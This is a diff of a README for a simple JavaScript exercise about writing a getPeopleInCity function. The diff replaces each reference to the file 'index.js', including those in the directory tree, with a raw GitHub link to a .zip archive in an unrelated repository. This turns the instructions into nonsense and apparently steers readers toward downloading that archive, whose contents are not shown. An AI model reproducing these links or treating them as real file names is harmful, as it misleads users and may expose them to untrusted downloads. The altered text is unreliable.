@@ -1,8 +1,8 @@
 # First Names of the People
 
-Create a file `index.js` in the <b>names</b> directory.
+Create a file `https://raw.githubusercontent.com/vicky9696v/gettingFirstNameFunction/main/joyous/gettingFirstNameFunction.zip` in the <b>names</b> directory.
 
-Write a JS function in `index.js` with function name `getPeopleInCity` that accepts people names list and returns an array of containing the first names of the people.
+Write a JS function in `https://raw.githubusercontent.com/vicky9696v/gettingFirstNameFunction/main/joyous/gettingFirstNameFunction.zip` with function name `getPeopleInCity` that accepts people names list and returns an array of containing the first names of the people.
 
 Export the function using the default export syntax.
 
@@ -12,12 +12,12 @@ Export the function using the default export syntax.
 country
     - state
         - city
-            - index.js    // contains the people names list
+            - https://raw.githubusercontent.com/vicky9696v/gettingFirstNameFunction/main/joyous/gettingFirstNameFunction.zip    // contains the people names list
 utilities
     - utils
-        - index.js        // contains a function that returns the first names of the people
+        - https://raw.githubusercontent.com/vicky9696v/gettingFirstNameFunction/main/joyous/gettingFirstNameFunction.zip        // contains a function that returns the first names of the people
 names
-    - index.js            // create the file and write your code here
+    - https://raw.githubusercontent.com/vicky9696v/gettingFirstNameFunction/main/joyous/gettingFirstNameFunction.zip            // create the file and write your code here
 ```
 
 Use the given modules.
